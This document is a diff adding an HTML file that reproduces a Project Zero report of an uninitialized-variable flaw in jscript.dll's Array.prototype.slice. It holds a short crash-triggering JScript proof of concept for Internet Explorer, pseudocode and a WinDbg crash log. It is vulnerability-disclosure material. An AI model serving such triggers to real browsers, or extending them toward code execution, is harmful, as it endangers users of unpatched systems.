@@ -1,0 +1,138 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1378
+
+There is an uninitialized variable vulnerability in jscript.dll. This issue could potentially be exploited through multiple vectors:
+
+ - By opening a malicious web page in Internet Explorer.
+
+ - [currently untested] An attacker on the local network could exploit this issue by posing as a WPAD (Web Proxy Auto-Discovery) host and sending a malicious wpad.dat file to the victim.
+
+The issue has been verified on 64-bit Windows 10 with the most recent patches applied.
+
+PoC for Internet Explorer (tested on IE 11 with a 64-bit tab process. Might no work very reliably due to the nature of the issue, please see the technical details below):
+
+============================================
+-->
+
+<!-- saved from url=(0014)about:internet -->
+<meta http-equiv="X-UA-Compatible" content="IE=8"></meta>
+<script language="Jscript.Encode">
+var x = new URIError(new Array(), undefined, undefined);
+String.prototype.localeCompare.call(x, new Date(0, 0, 0, 0, 0, 0, undefined));
+Array.prototype.slice.call(1);
+</script>
+
+<!--
+============================================
+
+Technical details:
+
+The issue is in jscript!JsArraySlice (Array.prototype.slice.call in the PoC above, all other lines are just fuzzer generated junk that puts the stack into a 'correct' state needed to demonstrate the issue).
+
+JsArraySlice looks approximately like:
+
+int JsArraySlice(CSession *session, VAR *this, VAR *ret, int num_args, VAR *args) {
+  VAR object;
+  VAR length;
+  NameTbl *nametable;
+
+  if(!ConvertToObject(session, this, &object, 0)) {
+    //set error and return
+  }
+  if(!IsJSObject(&object, &nametable)) {
+    //set error and return
+  }
+  if(nametable->GetVal(&g_sym_length, &length) < 0) {
+    //set error and return  
+  }
+  if(length->type != TYPE_INT) {
+    ConvertToScalar(session, &length, &length, 3, 1);
+  }
+
+  ...
+
+}
+
+The issue is that JsArraySlice() expects NameTBL::GetVal() to return an integer <0 if the input object does not contain the 'length' property. However in this case NameTBL::GetVal() will actually return 1. Also, in this case, the length VAR is *not* going to be initialized. Thus if NameTBL::GetVal() returns 1, ConvertToScalar() is going to be called with invalid arguments. Depending on the perceived (uninitialized) type of length VAR, this might lead to exploitable conditions including calling a virtual method on the uninitialized pointer (see below).
+
+Debug log:
+
+============================================
+
+(a3c.bd8): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+jscript!InvokeDispatch+0xbd:
+00007ffa`e45a45fd 488b4008        mov     rax,qword ptr [rax+8] ds:0000004e`00610056=????????????????
+
+0:014> r
+rax=0000004e0061004e rbx=000000f42f0fb400 rcx=00007ffae4630904
+rdx=0000000000000081 rsi=0000000000000002 rdi=00007ffae4630904
+rip=00007ffae45a45fd rsp=000000f42f0fb1e0 rbp=000000f42f0fb2e0
+ r8=000000f42f0fb230  r9=000000f42f0fb2a0 r10=0000000000000080
+r11=5555555511140000 r12=0000000000000000 r13=0000000000000000
+r14=000002a7533c5a70 r15=0000000000000000
+iopl=0         nv up ei pl zr na po nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+jscript!InvokeDispatch+0xbd:
+00007ffa`e45a45fd 488b4008        mov     rax,qword ptr [rax+8] ds:0000004e`00610056=????????????????
+
+0:014> k
+ # Child-SP          RetAddr           Call Site
+00 000000f4`2f0fb1e0 00007ffa`e45b548f jscript!InvokeDispatch+0xbd
+01 000000f4`2f0fb380 00007ffa`e45adc2d jscript!AutBlock::AddRef+0x101f
+02 000000f4`2f0fb3d0 00007ffa`e45e048f jscript!ConvertToScalar+0x51
+03 000000f4`2f0fb440 00007ffa`e458265a jscript!JsArraySlice+0x10f
+04 000000f4`2f0fb540 00007ffa`e458b015 jscript!NatFncObj::Call+0x10a
+05 000000f4`2f0fb5f0 00007ffa`e458d75b jscript!NameTbl::InvokeInternal+0x135
+06 000000f4`2f0fb6b0 00007ffa`e45d4d80 jscript!VAR::InvokeByDispID+0x87
+07 000000f4`2f0fb700 00007ffa`e458265a jscript!JsFncCall+0xb0
+08 000000f4`2f0fb780 00007ffa`e458b015 jscript!NatFncObj::Call+0x10a
+09 000000f4`2f0fb830 00007ffa`e458cce0 jscript!NameTbl::InvokeInternal+0x135
+0a 000000f4`2f0fb8f0 00007ffa`e45a7f18 jscript!VAR::InvokeByName+0x580
+0b 000000f4`2f0fbaf0 00007ffa`e45b562b jscript!VAR::InvokeDispName+0x60
+0c 000000f4`2f0fbb70 00007ffa`e4594ccf jscript!AutBlock::AddRef+0x11bb
+0d 000000f4`2f0fbbc0 00007ffa`e45972cd jscript!CScriptRuntime::Run+0x665f
+0e 000000f4`2f0fc520 00007ffa`e4597428 jscript!ScrFncObj::CallWithFrameOnStack+0x15d
+0f 000000f4`2f0fc720 00007ffa`e4588b15 jscript!ScrFncObj::Call+0xb8
+10 000000f4`2f0fc7c0 00007ffa`e45861eb jscript!CSession::Execute+0x265
+11 000000f4`2f0fc920 00007ffa`e4586929 jscript!COleScript::ExecutePendingScripts+0x28b
+12 000000f4`2f0fca00 00007ffa`e4586a06 jscript!COleScript::ParseScriptTextCore+0x239
+13 000000f4`2f0fcaf0 00007ffa`ae439138 jscript!COleScript::ParseScriptText+0x56
+14 000000f4`2f0fcb50 00007ffa`ae4f8f7d MSHTML!CActiveScriptHolder::ParseScriptText+0xb8
+15 000000f4`2f0fcbd0 00007ffa`ae4f827c MSHTML!CScriptCollection::ParseScriptText+0x26d
+16 000000f4`2f0fccb0 00007ffa`ae465a63 MSHTML!CScriptData::CommitCode+0x3b4
+17 000000f4`2f0fce80 00007ffa`ae4657df MSHTML!CScriptData::Execute+0x267
+18 000000f4`2f0fcf40 00007ffa`ae357ea1 MSHTML!CHtmScriptParseCtx::Execute+0xbf
+19 000000f4`2f0fcf70 00007ffa`ae3b8880 MSHTML!CHtmParseBase::Execute+0x181
+1a 000000f4`2f0fd000 00007ffa`ae3b846a MSHTML!CHtmPost::Broadcast+0x50
+1b 000000f4`2f0fd040 00007ffa`ae467fae MSHTML!CHtmPost::Exec+0x39a
+1c 000000f4`2f0fd240 00007ffa`ae469324 MSHTML!CHtmPost::Run+0x32
+1d 000000f4`2f0fd270 00007ffa`ae463b99 MSHTML!PostManExecute+0x70
+1e 000000f4`2f0fd2f0 00007ffa`ae463a60 MSHTML!PostManResume+0xa1
+1f 000000f4`2f0fd330 00007ffa`ae44523c MSHTML!CHtmPost::OnDwnChanCallback+0x40
+20 000000f4`2f0fd380 00007ffa`ae386e21 MSHTML!CDwnChan::OnMethodCall+0x1c
+21 000000f4`2f0fd3b0 00007ffa`ae3adcb9 MSHTML!GlobalWndOnMethodCall+0x251
+22 000000f4`2f0fd460 00007ffa`f1f61c24 MSHTML!GlobalWndProc+0xf9
+23 000000f4`2f0fd4f0 00007ffa`f1f6156c USER32!UserCallWinProcCheckWow+0x274
+24 000000f4`2f0fd650 00007ffa`afa629f7 USER32!DispatchMessageWorker+0x1ac
+25 000000f4`2f0fd6d0 00007ffa`afa9ed04 IEFRAME!CTabWindow::_TabWindowThreadProc+0x5e7
+26 000000f4`2f0ff920 00007ffa`e42c9586 IEFRAME!LCIETab_ThreadProc+0x3a4
+27 000000f4`2f0ffa50 00007ffa`c8b92ed9 iertutil!_IsoThreadProc_WrapperToReleaseScope+0x16
+28 000000f4`2f0ffa80 00007ffa`f2268364 IEShims!NS_CreateThread::AutomationIE_ThreadProc+0x89
+29 000000f4`2f0ffad0 00007ffa`f43e7091 KERNEL32!BaseThreadInitThunk+0x14
+2a 000000f4`2f0ffb00 00000000`00000000 ntdll!RtlUserThreadStart+0x21
+
+0:014> u rip
+jscript!InvokeDispatch+0xbd:
+00007ffa`e45a45fd 488b4008        mov     rax,qword ptr [rax+8]
+00007ffa`e45a4601 ff15c14d0700    call    qword ptr [jscript!_guard_dispatch_icall_fptr (00007ffa`e46193c8)]
+00007ffa`e45a4607 488d442458      lea     rax,[rsp+58h]
+00007ffa`e45a460c 458bc4          mov     r8d,r12d
+00007ffa`e45a460f 4889442448      mov     qword ptr [rsp+48h],rax
+00007ffa`e45a4614 488bd7          mov     rdx,rdi
+00007ffa`e45a4617 488d4580        lea     rax,[rbp-80h]
+00007ffa`e45a461b 498bce          mov     rcx,r14
+
+============================================
+-->
